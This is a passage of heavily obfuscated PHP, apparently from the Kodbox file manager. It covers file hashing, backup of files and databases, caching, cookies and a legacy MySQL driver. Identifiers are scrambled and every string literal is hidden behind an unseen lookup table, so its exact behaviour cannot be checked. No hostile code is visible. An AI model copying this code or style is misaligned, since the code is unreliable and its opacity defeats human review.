!0; } list($ÖÓ¡¡õ, $çÉÇşµ†) = $this->bucketManager->listFiles($this->bucket, trim($²¬óŸè°, $û™ğ‡ó[8]) . $û™ğ‡ó[8], $û™ğ‡ó[12], 1, $û™ğ‡ó[8]); return !empty($ÖÓ¡¡õ[$û™ğ‡ó[1550]]) || !empty($ÖÓ¡¡õ[$û™ğ‡ó[1551]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ú½ş²–Í, $‰ÌìÁ»º = 0) { parent::__construct(); $this->source = $ú½ş²–Í; $this->sourceSize = $‰ÌìÁ»º; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($¸çİö¡ˆ = false) { return $this->sourceSize; } public function getContent($ŸÁ’Çæé = false) { return $this->fileSubstr($ŸÁ’Çæé, 0, $this->sourceSize); } public function fileSubstr($¶©ü’Å = false, $š¾ëë¸ = 0, $ª½‡Âß½ = 0) { if (!$ª½‡Âß½) { $ª½‡Âß½ = $this->sourceSize; } $éÕÇïË = $this->sourceSize - $š¾ëë¸; if ($ª½‡Âß½ >= $éÕÇïË) { $ª½‡Âß½ = $éÕÇïË; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $š¾ëë¸, $ª½‡Âß½); } if ($this->sourceType == self::TYPE_FILE) { if ($ª½‡Âß½ <= 0) { return $_SERVER[‹‰”››ê][12]; } $ÄƒÀóÜ = ftell($this->source); fseek_64($this->source, $ÄƒÀóÜ + $š¾ëë¸); $ßáóñõñ = @fread($this->source, $ª½‡Âß½); fseek_64($this->source, $ÄƒÀóÜ); return $ßáóñõñ; } } public function hashMd5($¯Äƒ“ÊÈ = false) { return md5($this->getContent()); } public static function hash($ş® µ•, $†î†åâ© = 0) { $€¨¥šˆ¤ = new PathDriverStream($ş® µ•, $†î†åâ©); return $€¨¥šˆ¤->hashSimple($ş® µ•); } public static function md5($ÄÄ¶Ÿ©Å, $â©»îú© = 0) { $¦€îù›Ö = new PathDriverStream($ÄÄ¶Ÿ©Å, $â©»îú©); return $¦€îù›Ö->hashMd5($ÄÄ¶Ÿ©Å); } } goto DÕã§™Ï—; C«Ÿ¿”Õ’: class BackupDbFile { public function __construct() { } public function index() { $ù“ÈµöÈ =& $_SERVER[‹‰”››ê]; $½Ş·è’ = Backup::get(); $á¯ú¶¢÷ = $½Ş·è’[$ù“ÈµöÈ[32]]; $èèºÚ­¬ = $this->tmpFilesPath() . "\x62\x61\143\x6b\165\160\x5f{$á¯ú¶¢÷}\57"; $ŸÖŞÛÈë = $this->backupPath($½Ş·è’); if (!($ŸÖŞÛÈë = IO::mkdir($ŸÖŞÛÈë))) { Backup::log($ù“ÈµöÈ[890] . $ŸÖŞÛÈë); return !1; } $©‰š’äŞ = IO::listPath($èèºÚ­¬); $ºÏäÚ–³ = isset($©‰š’äŞ[$ù“ÈµöÈ[86]]) ? $©‰š’äŞ[$ù“ÈµöÈ[86]] : array(); $šşÜ¦œ = array_sum(array_column($ºÏäÚ–³, $ù“ÈµöÈ[79])); if (!$šşÜ¦œ) { Backup::log($ù“ÈµöÈ[891] . $èèºÚ­¬); return !1; } $ä¶Áú ø = array($ù“ÈµöÈ[892] => $šşÜ¦œ, $ù“ÈµöÈ[893] => time()); Backup::set($ä¶Áú ø); $ËæÌöœº = new TaskFileTransfer($ù“ÈµöÈ[894], $ù“ÈµöÈ[867], count($ºÏäÚ–³), LNG($ù“ÈµöÈ[876]) . $ù“ÈµöÈ[474] . LNG($ù“ÈµöÈ[878]) . $ù“ÈµöÈ[895]); $ËæÌöœº->task[$ù“ÈµöÈ[853]] = $šşÜ¦œ; foreach ($©‰š’äŞ[$ù“ÈµöÈ[86]] as $˜Œü½ºÌ) { $Ë·½¢Ÿ± = IO::move($˜Œü½ºÌ[$ù“ÈµöÈ[87]], $ŸÖŞÛÈë); if (!$Ë·½¢Ÿ±) { $ËæÌöœº->end(); $ûéü«â‘ = IO::getLastError($ù“ÈµöÈ[896] . $˜Œü½ºÌ[$ù“ÈµöÈ[87]] . $ù“ÈµöÈ[897] . $ŸÖŞÛÈë . $ù“ÈµöÈ[178]); Backup::log($ûéü«â‘); return !1; } } $ôÚ—‹‰Ó = new DbManage(); $ıóö‚ğÆ = $ôÚ—‹‰Ó->getSqlFile(); if (!$ıóö‚ğÆ[$ù“ÈµöÈ[898]] || !$ıóö‚ğÆ[$ù“ÈµöÈ[13]]) { Backup::log($ù“ÈµöÈ[899]); return !1; } IO::move($ıóö‚ğÆ[$ù“ÈµöÈ[898]], $ŸÖŞÛÈë); IO::move($ıóö‚ğÆ[$ù“ÈµöÈ[13]], $ŸÖŞÛÈë); $ËæÌöœº->end(); $ä¶Áú ø = array($ù“ÈµöÈ[900] => $šşÜ¦œ, $ù“ÈµöÈ[901] => time()); Backup::set($ä¶Áú ø); return !0; } private function backupPath($Ø×Ş‚â÷) { $Ğâö°¦É =& $_SERVER[‹‰”››ê]; $íÀÄÂÅÂ = $Ø×Ş‚â÷[$Ğâö°¦É[32]]; $ª³ßİŸÎ = Model($Ğâö°¦É[860])->get($Ğâö°¦É[861]); $Ğ–Ì‡·Á = substr(md5($Ğâö°¦É[862] . $ª³ßİŸÎ . $íÀÄÂÅÂ), 0, 8); return "\173\151\157\72{$Ø×Ş‚â÷[$Ğâö°¦É[842]]}\x7d\x2f\144\141\x74\x61\142\x61\163\145\x2f\x62\x61\143\153\x75\160\57" . $íÀÄÂÅÂ . $Ğâö°¦É[11] . $Ğ–Ì‡·Á; } private function tmpFilesPath() { $û‘“œÅı =& $_SERVER[‹‰”››ê]; $ñƒ¥Ø·’ = TEMP_FILES; if ($GLOBALS[$û‘“œÅı[6]][$û‘“œÅı[92]][$û‘“œÅı[888]]) { $ñƒ¥Ø·’ = $GLOBALS[$û‘“œÅı[6]][$û‘“œÅı[92]][$û‘“œÅı[888]]; if (!mk_dir($ñƒ¥Ø·’) || !is_writable($ñƒ¥Ø·’) || !IO::mkfile($ñƒ¥Ø·’ . $û‘“œÅı[889])) { $ñƒ¥Ø·’ = TEMP_FILES; } } return $ñƒ¥Ø·’; } } class BackupFile { public function __construct() { } public function index() { $ÖÇ¶œÈ = Backup::get(); $À£ºÁÁ» = $ÖÇ¶œÈ[$_SERVER[‹‰”››ê][380]][$_SERVER[‹‰”››ê][233]][$_SERVER[‹‰”››ê][555]]; $èÀµå¦ß = array($_SERVER[‹‰”››ê][556] => array($_SERVER[‹‰”››ê][902], $À£ºÁÁ»), $_SERVER[‹‰”››ê][903] => array($_SERVER[‹‰”››ê][418], $ÖÇ¶œÈ[$_SERVER[‹‰”››ê][842]])); $í²Ôç = (int) Model($_SERVER[‹‰”››ê][881])->where($èÀµå¦ß)->count($_SERVER[‹‰”››ê][555]); $ñ¶®¢‘Å = (int) Model($_SERVER[‹‰”››ê][881])->where($èÀµå¦ß)->sum($_SERVER[‹‰”››ê][79]); $òŠ‚Ò = new TaskFileTransfer($_SERVER[‹‰”››ê][904], $_SERVER[‹‰”››ê][867], $í²Ôç, LNG($_SERVER[‹‰”››ê][876]) . $_SERVER[‹‰”››ê][877] . LNG($_SERVER[‹‰”››ê][905])); $òŠ‚Ò->task[$_SERVER[‹‰”››ê][853]] = $ñ¶®¢‘Å; $°å¾ ÷ = array($_SERVER[‹‰”››ê][906] => $í²Ôç, $_SERVER[‹‰”››ê][907] => $ñ¶®¢‘Å, $_SERVER[‹‰”››ê][908] => time()); Backup::set($°å¾ ÷); $–ÎûËáâ = !0; $…ï§¡‹® = $this->storeIds(); $µ¶÷ºÒ” = 1; $ÙÕØûÅı = 1000; $¡û©éëú = $–¨¢Îğ = 0; $íƒÃ¦Ï½ = array(); $Ÿ¶®¾Ï = $ïïö°õ = 0; do { $ìúÖÇÌò = $_SERVER[‹‰”››ê][909]; $Ÿùï™Œº = Model($_SERVER[‹‰”››ê][881])->where($èÀµå¦ß)->field($ìúÖÇÌò)->order($_SERVER[‹‰”››ê][910])->selectPage($ÙÕØûÅı, $µ¶÷ºÒ”); $ãË©Ÿù = !empty($Ÿùï™Œº[$_SERVER[‹‰”››ê][457]]) ? $Ÿùï™Œº[$_SERVER[‹‰”››ê][457]] : array(); foreach ($ãË©Ÿù as $°ä¾„) { if (!$this->_fileExist($°ä¾„, $íƒÃ¦Ï½, $…ï§¡‹®)) { Backup::log($_SERVER[‹‰”››ê][911] . $°ä¾„[$_SERVER[‹‰”››ê][555]] . $_SERVER[‹‰”››ê][912] . $°ä¾„[$_SERVER[‹‰”››ê][87]]); continue; } $¬ö­ĞøÏ = $°ä¾„[$_SERVER[‹‰”››ê][87]]; $¶á”ñ¨ = "\x7b\151\157\x3a{$ÖÇ¶œÈ[$_SERVER[‹‰”››ê][842]]}\x7d" . substr($¬ö­ĞøÏ, strlen("\173\151\x6f\x3a{$°ä¾„[$_SERVER[‹‰”››ê][913]]}\x7d")); if (IO::exist($¶á”ñ¨)) { $òŠ‚Ò->updateFileEnd($°ä¾„[$_SERVER[‹‰”››ê][32]], $°ä¾„[$_SERVER[‹‰”››ê][79]]); } else { $¶á”ñ¨ = get_path_father($¶á”ñ¨); IO::mkdir($¶á”ñ¨); if (!IO::copy($¬ö­ĞøÏ, $¶á”ñ¨, $_SERVER[‹‰”››ê][914])) { Backup::log($_SERVER[‹‰”››ê][915] . $¬ö­ĞøÏ . $_SERVER[‹‰”››ê][897] . $¶á”ñ¨ . $_SERVER[‹‰”››ê][178]); $–ÎûËáâ = !1; break; } } $À£ºÁÁ» = $°ä¾„[$_SERVER[‹‰”››ê][555]]; $–¨¢Îğ += 1; $¡û©éëú += $°ä¾„[$_SERVER[‹‰”››ê][79]]; $ïïö°õ += 1; $Ÿ¶®¾Ï += $°ä¾„[$_SERVER[‹‰”››ê][79]]; if ($¡û©éëú >= 1024 * 1024 * 100) { $°å¾ ÷ = array($_SERVER[‹‰”››ê][841] => $À£ºÁÁ», $_SERVER[‹‰”››ê][916] => $ïïö°õ, $_SERVER[‹‰”››ê][917] => $Ÿ¶®¾Ï); Backup::set($°å¾ ÷); $¡û©éëú = $–¨¢Îğ = 0; } } $¹ù™Ìùğ = count($ãË©Ÿù); $µ¶÷ºÒ”++; } while ($¹ù™Ìùğ == $ÙÕØûÅı); $òŠ‚Ò->end(); $°å¾ ÷ = array($_SERVER[‹‰”››ê][918] => 1, $_SERVER[‹‰”››ê][851] => time(), $_SERVER[‹‰”››ê][865] => 1, $_SERVER[‹‰”››ê][841] => $À£ºÁÁ», $_SERVER[‹‰”››ê][919] => time()); if ($–¨¢Îğ) { $°å¾ ÷[$_SERVER[‹‰”››ê][916]] = $ïïö°õ; $°å¾ ÷[$_SERVER[‹‰”››ê][917]] = $Ÿ¶®¾Ï; } Backup::set($°å¾ ÷); return !0; } private function _fileExist($Šó¬àŸ£, &$•õ‚ƒ‘, $ÜŸŒØÛÃ) { $á«©±½£ =& $_SERVER[‹‰”››ê]; $Ìö…ƒ’è = $Šó¬àŸ£[$á«©±½£[87]]; if (in_array($Šó¬àŸ£[$á«©±½£[555]], $•õ‚ƒ‘)) { return !1; } if (!in_array($Šó¬àŸ£[$á«©±½£[913]], $ÜŸŒØÛÃ)) { return !1; } if (IO::exist($Ìö…ƒ’è)) { return !0; } $³¡Şş = get_path_father($Ìö…ƒ’è); if (IO::exist($³¡Şş)) { $•õ‚ƒ‘[] = $Šó¬àŸ£[$á«©±½£[555]]; return !1; } $í»¨èè = array($á«©±½£[913] => $Šó¬àŸ£[$á«©±½£[913]], $á«©±½£[87] => array($á«©±½£[471], "{$³¡Şş}\45")); $³˜àœ·Ò = Model($á«©±½£[881])->where($í»¨èè)->field($á«©±½£[556])->select(); $•õ‚ƒ‘ = array_merge($•õ‚ƒ‘, array_to_keyvalue($³˜àœ·Ò, $á«©±½£[12], $á«©±½£[555])); return !1; } private function _fileFilter($Æ›„‚ã) { $ÑÌ®¶ ¸ =& $_SERVER[‹‰”››ê]; return; if (empty($Æ›„‚ã)) { return; } $‘»½‰ÑÙ = array($ÑÌ®¶ ¸[555] => array($ÑÌ®¶ ¸[7], array_unique($Æ›„‚ã))); $Õ³ÁÔÛü = Model($ÑÌ®¶ ¸[920])->where($‘»½‰ÑÙ)->field($ÑÌ®¶ ¸[194])->select(); foreach ($Õ³ÁÔÛü as $©÷µˆ) { Model($ÑÌ®¶ ¸[920])->remove($©÷µˆ[$ÑÌ®¶ ¸[194]], !1); } } private function storeIds() { $æú„ÜŸ— =& $_SERVER[‹‰”››ê]; $é³ü¨Çµ = Model($æú„ÜŸ—[857])->listData(); $ß”ê—ÙÀ = array(); $”¦¡•½Í = $GLOBALS[$æú„ÜŸ—[6]][$æú„ÜŸ—[92]][$æú„ÜŸ—[921]]; foreach ($é³ü¨Çµ as $ë‰Íº‰£) { $ğ„êˆŒ = strtolower($ë‰Íº‰£[$æú„ÜŸ—[98]]); if (!isset($”¦¡•½Í[$ğ„êˆŒ])) { continue; } $Ú¼åÀòæ = $æú„ÜŸ—[77] . (isset($”¦¡•½Í[$ğ„êˆŒ]) ? $”¦¡•½Í[$ğ„êˆŒ] : ucfirst($ğ„êˆŒ)); if (!class_exists($Ú¼åÀòæ)) { continue; } $ß”ê—ÙÀ[] = $ë‰Íº‰£[$æú„ÜŸ—[487]]; } return $ß”ê—ÙÀ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ˆùÖ¥ç“ =& $_SERVER[‹‰”››ê]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ù³­ÍÄÈ = $GLOBALS[$ˆùÖ¥ç“[6]][$ˆùÖ¥ç“[436]]; $Ã–ü‡÷¦ = $ù³­ÍÄÈ[$ù³­ÍÄÈ[$ˆùÖ¥ç“[922]]]; $ó»îâ¥Ü = $ù³­ÍÄÈ[$ˆùÖ¥ç“[923]]; switch ($ù³­ÍÄÈ[$ˆùÖ¥ç“[922]]) { case $ˆùÖ¥ç“[21]: self::$handle = Model($ˆùÖ¥ç“[924]); break; case $ˆùÖ¥ç“[925]: self::$handle = new CacheRedis($Ã–ü‡÷¦, $ó»îâ¥Ü); break; case $ˆùÖ¥ç“[926]: self::$handle = new CacheMemcached($Ã–ü‡÷¦, $ó»îâ¥Ü); break; case $ˆùÖ¥ç“[233]: self::$handle = new CacheFile($Ã–ü‡÷¦, $ó»îâ¥Ü); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ú¡Çö ·) { if (is_array($Ú¡Çö ·) || is_object($Ú¡Çö ·)) { $Ú¡Çö · = json_encode($Ú¡Çö ·); } $Ú¡Çö · = rawurlencode($Ú¡Çö ·); return md5(KOD_SITE_ID . $_SERVER[‹‰”››ê][11] . $Ú¡Çö ·); } public static function get($§ş‰èğ¼, $€µŒ½¼ï = false) { $œ²Ì±„† = self::key($§ş‰èğ¼); $Œ½ëÛÔå = self::init(); if ($€µŒ½¼ï) { return unserialize($Œ½ëÛÔå->get($œ²Ì±„†)); } if (!isset(self::$memoryCache[$œ²Ì±„†])) { $„ğŒ‰¢ = $Œ½ëÛÔå->get($œ²Ì±„†); self::$memoryCache[$œ²Ì±„†] = unserialize($„ğŒ‰¢); } return self::$memoryCache[$œ²Ì±„†]; } public static function set($²İóÔ·‚, $Òî›Ÿ, $°Î™Üõ = false) { $»¡³¦½Í =& $_SERVER[‹‰”››ê]; $‘¾ÅÊª… = self::key($²İóÔ·‚); if (isset(self::$memoryCache[$‘¾ÅÊª…]) && self::$memoryCache[$‘¾ÅÊª…] === $Òî›Ÿ) { return !0; } if ($°Î™Üõ === 0) { self::$memoryCache[$‘¾ÅÊª…] = $Òî›Ÿ; return !0; } $Ê˜Î„æ§ = self::init(); $°ÙØè” = serialize($Òî›Ÿ); CacheLock::lock($²İóÔ·‚ . $»¡³¦½Í[927]); $œ–Ó¾Ğ  = $Ê˜Î„æ§->set($‘¾ÅÊª…, $°ÙØè”, $°Î™Üõ); self::$memoryCache[$‘¾ÅÊª…] = $Òî›Ÿ; CacheLock::unlock($²İóÔ·‚ . $»¡³¦½Í[927]); return $œ–Ó¾Ğ ; } public static function getCall($ƒëÂ……Ü, $¡ß­¼ı¤, $™»‡¯…, $›¼İ«é¨ = array()) { $ğñ»ˆÒ =& $_SERVER[‹‰”››ê]; $İ•¥”ûç = self::get($ƒëÂ……Ü); if ($İ•¥”ûç || $İ•¥”ûç === $ğñ»ˆÒ[12]) { return $İ•¥”ûç; } $İ•¥”ûç = call_user_func_array($™»‡¯…, $›¼İ«é¨); $İ•¥”ûç = $İ•¥”ûç ? $İ•¥”ûç : $ğñ»ˆÒ[12]; self::set($ƒëÂ……Ü, $İ•¥”ûç, $¡ß­¼ı¤); return $İ•¥”ûç; } public static function remove($à¸ĞåèË) { $¯ÁÅÏï× = self::key($à¸ĞåèË); unset(self::$memoryCache[$¯ÁÅÏï×]); self::clearTimeout(); CacheLock::lock($à¸ĞåèË); $³¨¾ª = self::init()->remove($¯ÁÅÏï×); CacheLock::unlock($à¸ĞåèË); return $³¨¾ª; } public static function removeMemory($çà®“üş) { $¬“«¼Õ¹ = self::key($çà®“üş); unset(self::$memoryCache[$¬“«¼Õ¹]); } public static function clearMemory($Í¨Ô ö¸ = false) { if ($Í¨Ô ö¸) { $Í¨Ô ö¸ = self::key($Í¨Ô ö¸); unset(self::$memoryCache[$Í¨Ô ö¸]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[‹‰”››ê][928])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[‹‰”››ê][929])) { self::init()->clearTimeout(); } } } goto e£“á®”Ğ; AÊË›åèèª: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¢¦ä‘ë‡ = '', $½ó…áñÓ = 0) { if (is_string($¢¦ä‘ë‡) && $¢¦ä‘ë‡ != $_SERVER[‹‰”››ê][12]) { $this->prefix = $¢¦ä‘ë‡; } if (is_numeric($½ó…áñÓ) && $½ó…áñÓ > 0) { $this->expire = $½ó…áñÓ; } } public static function getInstance() { static $İÂ®€Ó»; if ($İÂ®€Ó» === null) { $İÂ®€Ó» = new self(); } return $İÂ®€Ó»; } private static $cookieDisable = false; public static function disable($×Ê¿Ö¤) { self::$cookieDisable = $×Ê¿Ö¤; } private static $sameCookieSet = array(); public static function set($ùÎæ¡†Ì, $ãêÇÀÏ¬, $„úŞ³£ = 0, $‹à×»º = false, $Î²˜– = false) { $š¹÷Êé¶ =& $_SERVER[‹‰”››ê]; if (self::$cookieDisable) { return; } if (!$„úŞ³£) { $„úŞ³£ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ùÎæ¡†Ì]) && self::$sameCookieSet[$ùÎæ¡†Ì] == $ãêÇÀÏ¬ . $„úŞ³£) { return; } self::$sameCookieSet[$ùÎæ¡†Ì] = $ãêÇÀÏ¬ . $„úŞ³£; if (!$Î²˜–) { $Î²˜– = str_replace(HOST, $š¹÷Êé¶[12], APP_HOST); $Î²˜– = _get($GLOBALS, $š¹÷Êé¶[976], $Î²˜–); } $Œ×Á×™Â = $š¹÷Êé¶[12]; setcookie($ùÎæ¡†Ì, $ãêÇÀÏ¬, time() + $„úŞ³£, $š¹÷Êé¶[8] . trim($Î²˜–, $š¹÷Êé¶[8]) . $Œ×Á×™Â, !1, !1, $‹à×»º); } public static function setSafe($ß¶œ”İŒ, $êà™€ï·, $“î¹¸úÍ = 0) { self::set($ß¶œ”İŒ, $êà™€ï·, $“î¹¸úÍ, !0); } public static function get($Ÿ¤½¤¼Ï) { static $ºŒÆ³· = false; if (!$ºŒÆ³·) { self::initHeaderCookie(); $ºŒÆ³· = !0; } return isset($_COOKIE[$Ÿ¤½¤¼Ï]) ? $_COOKIE[$Ÿ¤½¤¼Ï] : !1; } private static function initHeaderCookie() { $ÌÌâÎñ =& $_SERVER[‹‰”››ê]; if (!isset($_SERVER[$ÌÌâÎñ[977]]) || !$_SERVER[$ÌÌâÎñ[977]]) { return; } $¤Ö­½¼ = explode($ÌÌâÎñ[74], $_SERVER[$ÌÌâÎñ[977]]); foreach ($¤Ö­½¼ as $º—î„£‡) { $º—î„£‡ = explode($ÌÌâÎñ[518], $º—î„£‡); if (count($º—î„£‡) != 2 || !isset($º—î„£‡[1])) { continue; } $_COOKIE[trim($º—î„£‡[0])] = trim($º—î„£‡[1]); } } public static function remove($°Ã¢Àç†, $¡æÃ–ôó = false) { unset($_COOKIE[$°Ã¢Àç†]); self::set($°Ã¢Àç†, $_SERVER[‹‰”››ê][12], 1, $¡æÃ–ôó); } } class DbMysql extends Db { public function __construct($§Øü¾–´ = '') { $Áªùõ”– =& $_SERVER[‹‰”››ê]; if (!extension_loaded($Áªùõ”–[898])) { think_exception(think_lang($Áªùõ”–[14]) . $Áªùõ”–[978]); } if (!empty($§Øü¾–´)) { $this->config = $§Øü¾–´; if (empty($this->config[$Áªùõ”–[17]])) { $this->config[$Áªùõ”–[17]] = $Áªùõ”–[12]; } } } public function connect($ıÀ§ıİñ = '', $õ¿í¡º = 0, $ğÕÓ›ç = false) { $¼àØü™ =& $_SERVER[‹‰”››ê]; if (!isset($this->linkID[$õ¿í¡º])) { if (empty($ıÀ§ıİñ)) { $ıÀ§ıİñ = $this->config; } $ùßÅ¿¾Ú = $ıÀ§ıİñ[$¼àØü™[979]] . ($ıÀ§ıİñ[$¼àØü™[980]] ? "\x3a{$ıÀ§ıİñ[$¼àØü™[980]]}" : $¼àØü™[12]); $‚í¢£Š´ = !empty($ıÀ§ıİñ[$¼àØü™[17]][$¼àØü™[18]]) ? $ıÀ§ıİñ[$¼àØü™[17]][$¼àØü™[18]] : $this->pconnect; if ($‚í¢£Š´) { $this->linkID[$õ¿í¡º] = mysql_pconnect($ùßÅ¿¾Ú, $ıÀ§ıİñ[$¼àØü™[981]], $ıÀ§ıİñ[$¼àØü™[982]], 131072); } else { $this->linkID[$õ¿í¡º] = mysql_connect($ùßÅ¿¾Ú, $ıÀ§ıİñ[$¼àØü™[981]], $ıÀ§ıİñ[$¼àØü™[982]], !0, 131072); } if (!$this->linkID[$õ¿í¡º] || !empty($ıÀ§ıİñ[$¼àØü™[21]]) && !mysql_select_db($ıÀ§ıİñ[$¼àØü™[21]], $this->linkID[$õ¿í¡º])) { think_exception(mysql_error()); } $¶…ĞºÑÁ = mysql_get_server_info($this->linkID[$õ¿í¡º]); mysql_query($¼àØü™[983] . think_config($¼àØü™[984]) . $¼àØü™[58], $this->linkID[$õ¿í¡º]); if ($¶…ĞºÑÁ > $¼àØü™[985]) { mysql_query($¼àØü™[986], $this->linkID[$õ¿í¡º]); } $this->connected = !0; if (1 != think_config($¼àØü™[22])) { unset($this->config); } } return $this->linkID[$õ¿í¡º]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Èã‘ë·) { $Ú ’Ÿõ¦ =& $_SERVER[‹‰”››ê]; if (0 === stripos($Èã‘ë·, $Ú ’Ÿõ¦[353])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Èã‘ë·; if ($this->queryID) { $this->free(); } think_action_status($Ú ’Ÿõ¦[23], 1); think_status($Ú ’Ÿõ¦[24]); $this->queryID = mysql_query($Èã‘ë·, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($½ÎÆüÇ¹) { $ËÄÜ°¼ =& $_SERVER[‹‰”››ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $½ÎÆüÇ¹; if ($this->queryID) { $this->free(); } think_action_status($ËÄÜ°¼[25], 1); think_status($ËÄÜ°¼[24]); $º»ØĞ”‹ = mysql_query($½ÎÆüÇ¹, $this->_linkID); $this->debug(); if (!1 === $º»ØĞ”‹) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[‹‰”››ê][987], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $­üœŒÉÓ = mysql_query($_SERVER[‹‰”››ê][988], $this->_linkID); $this->transTimes = 0; if (!$­üœŒÉÓ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $´ÂÔÆî® = mysql_query($_SERVER[‹‰”››ê][989], $this->_linkID); $this->transTimes = 0; if (!$´ÂÔÆî®) { $this->error(); return !1; } } return !0; } private function getAll() { $Å£Æğ‡Œ = array(); if ($this->numRows > 0) { while ($¶Äó©½ = mysql_fetch_assoc($this->queryID)) { $Å£Æğ‡Œ[] = $¶Äó©½; } mysql_data_seek($this->queryID, 0); } return $Å£Æğ‡Œ; } public function getFields($ôåşĞœ) { $ßÛ¦”æğ =& $_SERVER[‹‰”››ê]; $‹÷ì•ôï = $this->query($ßÛ¦”æğ[990] . $this->parseKey($ôåşĞœ)); $œŸ¶ê¶ = array(); if ($‹÷ì•ôï) { foreach ($‹÷ì•ôï as $Ûæ¶İ¤ => $ÓïáÏÕ) { $œŸ¶ê¶[$ÓïáÏÕ[$ßÛ¦”æğ[31]]] = array($ßÛ¦”æğ[32] => $ÓïáÏÕ[$ßÛ¦”æğ[31]], $ßÛ¦”æğ[33] => $ÓïáÏÕ[$ßÛ¦”æğ[34]], $ßÛ¦”æğ[35] => (bool) (strtoupper($ÓïáÏÕ[$ßÛ¦”æğ[36]]) === $ßÛ¦”æğ[991]), $ßÛ¦”æğ[37] => $ÓïáÏÕ[$ßÛ¦”æğ[38]], $ßÛ¦”æğ[39] => strtolower($ÓïáÏÕ[$ßÛ¦”æğ[40]]) == $ßÛ¦”æğ[41], $ßÛ¦”æğ[42] => strtolower($ÓïáÏÕ[$ßÛ¦”æğ[43]]) == $ßÛ¦”æğ[44]); } } return $œŸ¶ê¶; } public function getTables($†§ ğÏ = '') { $’Ü«‚£² =& $_SERVER[‹‰”››ê]; if (!empty($†§ ğÏ)) { $©âÕ§Â = $’Ü«‚£²[992] . $†§ ğÏ . $’Ü«‚£²[993]; } else { $©âÕ§Â = $’Ü«‚£²[994]; } $çòİÌ¼³ = $this->query($©âÕ§Â); $Œ»ªˆà = array(); foreach ($çòİÌ¼³ as $šëÂ¢÷— => $’³‘Ğ˜¤) { $Œ»ªˆà[$šëÂ¢÷—] = current($’³‘Ğ˜¤); } return $Œ»ªˆà; } public function replace($’Æ½†Ä¶, $Üõéä‡ = array()) { $ÇÄ¨¿­ =& $_SERVER[‹‰”››ê]; foreach ($’Æ½†Ä¶ as $£Œ²ÁŠæ => $Öó£‘Æ†) { $ø£âÏ‘Å = $this->parseValue($Öó£‘Æ†); if (is_scalar($ø£âÏ‘Å)) { $éº”±öÛ[] = $ø£âÏ‘Å; $Ÿ¥ÒÊÊ«[] = $this->parseKey($£Œ²ÁŠæ); } } $ó¬ØÊ²î = $ÇÄ¨¿­[995] . $this->parseTable($Üõéä‡[$ÇÄ¨¿­[368]]) . $ÇÄ¨¿­[996] . implode($ÇÄ¨¿­[50], $Ÿ¥ÒÊÊ«) . $ÇÄ¨¿­[997] . implode($ÇÄ¨¿­[50], $éº”±öÛ) . $ÇÄ¨¿­[998]; return $this->execute($ó¬ØÊ²î); } public function insertAll($ˆùö¹, $òìñ’¹’ = array(), $€˜–±ï› = false) { $¯Èòñ“ş =& $_SERVER[‹‰”››ê]; if (!is_array($ˆùö¹[0])) { return !1; } $ñ¹¿ü = array_keys($ˆùö¹[0]); $²Â€ù = array(); foreach ($ˆùö¹ as $Ã÷á¾¨€) { $Ä‰ÎÓ™± = array(); foreach ($Ã÷á¾¨€ as $¤¼¾Ç’Ô => $ÍÁÂëóò) { $ÍÁÂëóò = $this->parseValue($ÍÁÂëóò); if (is_scalar($ÍÁÂëóò)) { $Ä‰ÎÓ™±[] = $ÍÁÂëóò; } } $²Â€ù[] = $¯Èòñ“ş[349] . implode($¯Èòñ“ş[50], $Ä‰ÎÓ™±) . $¯Èòñ“ş[998]; } array_walk($ñ¹¿ü, array($this, $¯Èòñ“ş[999])); $û‹®çãÖ = ($€˜–±ï› ? $¯Èòñ“ş[1000] : $¯Èòñ“ş[1001]) . $¯Èòñ“ş[1002] . $this->parseTable($òìñ’¹’[$¯Èòñ“ş[368]]) . $¯Èòñ“ş[996] . implode($¯Èòñ“ş[50], $ñ¹¿ü) . $¯Èòñ“ş[1003] . implode($¯Èòñ“ş[50], $²Â€ù); return $this->execute($û‹®çãÖ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $±âçÛÏë =& $_SERVER[‹‰”››ê]; $this->error = mysql_errno() . $±âçÛÏë[4] . mysql_error($this->_linkID); if ($±âçÛÏë[12] != $this->queryStr) { $this->error .= LNG($±âçÛÏë[48]) . $this->queryStr; } think_trace($this->error, $±âçÛÏë[12], $±âçÛÏë[49]); return $this->error; } public function escapeString($ıñß«™’) { if ($this->_linkID) { return mysql_real_escape_string($ıñß«™’, $this->_linkID); } else { return mysql_escape_string($ıñß«™’); } } public function parseKey(&$éÃÖÚü‘, $’Ğ½Òèì = true) { $¿õİ¼Şô =& $_SERVER[‹‰”››ê]; if ($’Ğ½Òèì) { $éÃÖÚü‘ = $this->parseKeyCheck($éÃÖÚü‘); } if ($éÃÖÚü‘ != $¿õİ¼Şô[223] && !preg_match($¿õİ¼Şô[1004], $éÃÖÚü‘)) { $éÃÖÚü‘ = $¿õİ¼Şô[473] . trim($éÃÖÚü‘, 